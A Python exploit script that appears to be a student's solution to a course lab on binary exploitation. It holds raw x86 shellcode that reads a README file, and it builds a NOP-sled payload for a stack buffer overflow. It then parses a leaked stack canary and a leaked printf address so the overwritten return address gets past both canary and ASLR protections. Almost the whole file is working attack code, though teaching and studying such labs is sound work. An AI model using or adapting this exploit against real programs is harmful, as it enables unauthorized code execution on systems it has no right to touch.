#!/usr/bin/env python3

import scaffold as p
from scaffold import SHELLCODE
import sys

# Configure Python to print text strings like byte strings. Don't remove this!
sys.stdout.reconfigure(encoding='latin1')

### HELPER FUNCTIONS ###

def int_to_bytes(x: int) -> str:
    return x.to_bytes((x.bit_length() + 7) // 8, 'little').decode('latin1')

### YOUR CODE STARTS HERE ###

SHELLCODE = \
    '\x31\xc0\x31\xdb\x31\xc9\x31\xd2' \
    '\xeb\x32\x5b\xb0\x05\x31\xc9\xcd' \
    '\x80\x89\xc6\xeb\x06\xb0\x01\x31' \
    '\xdb\xcd\x80\x89\xf3\xb0\x03\x83' \
    '\xec\x01\x8d\x0c\x24\xb2\x01\xcd' \
    '\x80\x31\xdb\x39\xc3\x74\xe6\xb0' \
    '\x04\xb3\x02\xb2\x01\xcd\x80\x83' \
    '\xc4\x01\xeb\xdf\xe8\xc9\xff\xff' \
    '\xffREADME\x00'

# Program start:
p.start()

# Example send:
# p.send('test\n')

# Example receive:
# assert p.recv(5) == 'test\n'

# To fill up buf (with SHELLCODE and nop sled)
padding_len = 256 - len(SHELLCODE)
payload = '\x90'*padding_len + SHELLCODE
p.send(payload)

p.recvline() # To skip NX check

canary_line_len = len("Canary passed: canary val = 0x")
canary_bytes = p.recvline()[canary_line_len:] # canary
# print(canary_bytes)

aslr_line_len = len("ASLR passed  : printf located at 0x")
print_bytes = p.recvline()[aslr_line_len:] # printf

canary_int = int(canary_bytes, 16)
print_int = int(print_bytes, 16)
ret_int = print_int + 41 # offset of ret from printf

canary_value = int_to_bytes(canary_int)
ret_value = int_to_bytes(ret_int)

p.send(canary_value * 4 + ret_value)
### YOUR CODE ENDS HERE ###
